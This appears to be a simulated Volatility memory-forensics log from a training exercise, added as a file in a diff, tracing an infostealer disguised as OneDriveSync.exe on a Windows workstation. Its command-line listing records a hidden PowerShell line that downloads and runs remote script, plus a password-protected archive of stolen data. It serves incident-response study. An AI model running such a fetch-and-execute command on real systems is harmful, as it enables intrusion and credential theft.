@@ -1,0 +1,139 @@
+Volatility 3 Framework 2.7.0
+Progress: 100.00               PDB scanning finished
+=====================================================================
+$ vol -f mem.raw windows.pslist.PsList
+=====================================================================
+PID    PPID  ImageFileName      Offset(V)          Threads  Handles  SessionId  Wow64  CreateTime            ExitTime
+4      0     System             0xffff8b04c1a90040 187      -        N/A        False  2026-04-12 08:59:42   N/A
+88     4     Registry           0xffff8b04c22a10c0 4        -        N/A        False  2026-04-12 08:59:42   N/A
+352    4     smss.exe           0xffff8b04c31e2340 3        -        N/A        False  2026-04-12 08:59:44   N/A
+768    352   csrss.exe          0xffff8b04c3202040 12       -        1          False  2026-04-12 08:59:52   N/A
+1004   768   wininit.exe        0xffff8b04c4211440 4        -        0          False  2026-04-12 08:59:55   N/A
+1088   1004  services.exe       0xffff8b04c491a340 6        -        0          False  2026-04-12 08:59:56   N/A
+1200   1088  svchost.exe        0xffff8b04c4d13340 12       -        0          False  2026-04-12 09:00:04   N/A
+1552   1004  lsass.exe          0xffff8b04c4e21440 8        -        0          False  2026-04-12 08:59:58   N/A
+2001   1088  CcmExec.exe        0xffff8b04ce882140 22       -        0          False  2026-04-12 09:05:13   N/A
+2201   2001  powershell.exe     0xffff8b04ceab2340 6        -        0          False  2026-04-12 09:05:31   2026-04-12 09:05:33
+2412   768   chrome.exe         0xffff8b04d1023300 42       -        1          False  2026-04-12 09:39:12   N/A
+2680   1552  explorer.exe       0xffff8b04d020e100 88       -        1          False  2026-04-12 09:34:14   N/A
+2712   2680  OneDrive.exe       0xffff8b04d0221100 22       -        1          False  2026-04-12 09:34:16   N/A
+2900   2680  OUTLOOK.EXE        0xffff8b04d0311220 32       -        1          False  2026-04-12 09:15:07   N/A
+3210   3120  slack.exe          0xffff8b04d0442110 42       -        1          False  2026-04-12 09:22:03   N/A
+3480   3421  Teams.exe          0xffff8b04d0552330 61       -        1          False  2026-04-12 09:25:00   N/A
+3812   2680  powershell.exe     0xffff8b04d0f89080 12       -        1          False  2026-04-12 09:40:47   N/A
+4120   3812  OneDriveSync.exe   0xffff8b04d1a90340 8        -        1          False  2026-04-12 09:40:53   N/A
+5044   1088  MpCmdRun.exe       0xffff8b04d1c02220 4        -        0          False  2026-04-12 09:33:00   N/A
+5312   4120  7z.exe             0xffff8b04d2b71080 3        -        1          False  2026-04-12 09:41:31   2026-04-12 09:41:34
+6120   1088  MicrosoftEdgeUpd.exe 0xffff8b04d2d02020 6      -        0          False  2026-04-12 09:44:00   N/A
+6501   2680  Code.exe           0xffff8b04d2e11440 42       -        1          False  2026-04-12 09:50:00   N/A
+
+=====================================================================
+$ vol -f mem.raw windows.netscan.NetScan
+=====================================================================
+Offset             Proto  LocalAddr        LocalPort  RemoteAddr        RemotePort  State           PID   Owner
+0xffff8b04d1092000 TCPv4  10.10.42.87      52007      10.10.42.201      443         ESTABLISHED     4120  OneDriveSync.exe
+0xffff8b04d1092090 TCPv4  10.10.42.87      52001      10.10.42.201      443         CLOSED          4120  OneDriveSync.exe
+0xffff8b04d1093110 TCPv4  10.10.42.87      51014      52.85.132.111     443         ESTABLISHED     3210  slack.exe
+0xffff8b04d1093120 TCPv4  10.10.42.87      51100      52.114.132.14     443         ESTABLISHED     3480  Teams.exe
+0xffff8b04d1093188 TCPv4  10.10.42.87      52011      52.98.170.42      443         ESTABLISHED     2900  OUTLOOK.EXE
+0xffff8b04d1093220 TCPv4  10.10.42.87      52140      52.113.194.132    443         ESTABLISHED     6501  Code.exe
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "app_bound_encryption_provider"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+2412        <literal>  ""         0x7ff642b6f1c0    "app_bound_encryption_provider"
+2412        <literal>  ""         0x24b90c8f1e40    "app_bound_encryption_provider"
+4120        <literal>  ""         0x24b90c8f1e40    "app_bound_encryption_provider"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "expand 32-byte k"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+4120        <literal>  ""         0x7ff77c9e3020    "expand 32-byte k"
+4120        <literal>  ""         0x1b241f2c07c8    "expand 32-byte k"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "TeslaBrowser/5.5"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+4120        <literal>  ""         0x7ff77c9e5180    "TeslaBrowser/5.5"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "steamcommunity.com/profiles/"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+4120        <literal>  ""         0x7ff77c9e57c0    "steamcommunity.com/profiles/"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "Mozilla/5.0"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+2412        <literal>  ""         0x7ff64291d800    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ..."
+2680        <literal>  ""         0x7ff70b1a2100    "Mozilla/5.0 (Windows NT 10.0)"
+3812        <literal>  ""         0x000001eea18a20  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1"
+4120        <literal>  ""         0x000001bce02c40  "Mozilla/5.0 (Windows NT 10.0)"
+5044        <literal>  ""         0x7ff8c1902240    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Slack/4.39.90"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "SELECT * FROM"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+1200        <literal>  ""         0x7ff644c02010    "SELECT * FROM Win32_ComputerSystem"
+2001        <literal>  ""         0x7ff645d02010    "SELECT * FROM CCM_UpdateStatus"
+2412        <literal>  ""         0x000001aa2044f0  "SELECT * FROM chromium_favicons"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "Google Chrome"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+2412        <literal>  ""         0x7ff642a11020    "Google Chrome 129.0.6668.100"
+4120        <literal>  ""         0x000001bce03a10  "Google Chrome"
+
+=====================================================================
+$ vol -f mem.raw windows.yarascan.YaraScan --strings "cmd.exe"
+=====================================================================
+Process ID  Rule       Component  Address           Value
+2680        <literal>  ""         0x7ff70b1c1220    "cmd.exe"
+
+=====================================================================
+$ vol -f mem.raw windows.malfind.Malfind --pid 4120
+=====================================================================
+PID   Process           Start VPN          End VPN            Tag        Protection            CommitCharge Priv
+4120  OneDriveSync.exe  0x000001bce0000000 0x000001bce007ffff VadS       PAGE_EXECUTE_READWRITE 128         1
+      Disassembly:
+        00 00                            add    byte ptr [rax], al
+        4d 5a                            (MZ header)
+        90 00                            nop
+        03 00                            add    byte ptr [rax], al
+
+=====================================================================
+$ vol -f mem.raw windows.malfind.Malfind --pid 3812
+=====================================================================
+PID   Process           Start VPN          End VPN            Tag        Protection            CommitCharge Priv
+3812  powershell.exe    0x000001eea1800000 0x000001eea180ffff VadS       PAGE_EXECUTE_READWRITE 16          1
+      Disassembly:
+        4d 5a                            (MZ header)
+        90 00                            nop
+
+=====================================================================
+$ vol -f mem.raw windows.malfind.Malfind --pid 2412
+=====================================================================
+(no results — no anomalous private+exec allocations)
+
+=====================================================================
+$ vol -f mem.raw windows.malfind.Malfind --pid 3210
+=====================================================================
+(no results — no anomalous private+exec allocations)
+
+=====================================================================
+$ vol -f mem.raw windows.cmdline.CmdLine
+=====================================================================
+PID   Process           Args
+1200  svchost.exe       C:\Windows\System32\svchost.exe -k netsvcs -p
+2412  chrome.exe        "chrome.exe" --new-tab https://intranet.northwind.lab/finance
+3210  slack.exe         "slack.exe" --startup
+3812  powershell.exe    powershell -w hidden -c "iwr -useb http://10.10.42.200:8080/x.txt | iex"
+4120  OneDriveSync.exe  "C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe"
+5312  7z.exe            "C:\Program Files\7-Zip\7z.exe" a -pStG!7ip-42-nw -mx=1 C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\stealer_bundle.zip C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\
+6501  Code.exe          "C:\Users\katerina.morfopoulou\AppData\Local\Programs\Microsoft VS Code\Code.exe"
